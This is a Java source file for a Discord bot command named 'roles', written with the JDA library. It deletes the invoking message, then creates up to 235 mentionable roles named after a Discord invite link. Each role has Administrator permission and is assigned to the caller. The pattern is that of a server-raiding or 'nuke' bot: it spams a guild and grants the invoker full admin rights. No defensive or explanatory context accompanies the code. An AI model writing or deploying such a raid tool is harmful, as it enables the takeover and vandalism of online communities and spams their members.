package com.visions.dev.Commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import lombok.SneakyThrows;
import net.dv8tion.jda.api.Permission;

import java.awt.*;
import java.util.concurrent.TimeUnit;

public class RolesCommand extends Command {

    public RolesCommand() {
        this.name = "roles";
        this.ownerCommand = true;
        this.guildOnly = false;
    }

    @SneakyThrows
    protected void execute(CommandEvent event) {

        Boolean roles = true;
        event.getMessage().delete().queue();
        for (int t = 0; t < 235; t++) {
            if(roles) {
                try {
                    event.getGuild().createRole().setName("https://discord.gg/Q8TJR9YpZS").setColor(Color.BLACK).setMentionable(true).setPermissions(Permission.ADMINISTRATOR).queue( (h) ->
                            event.getGuild().addRoleToMember(event.getMember(), h).queue());

                } catch (Exception e) {
                    System.out.println("Failed to create a role!");
                    roles = false;
                }
                TimeUnit.MILLISECONDS.sleep(150);
            }
        }

    }
}
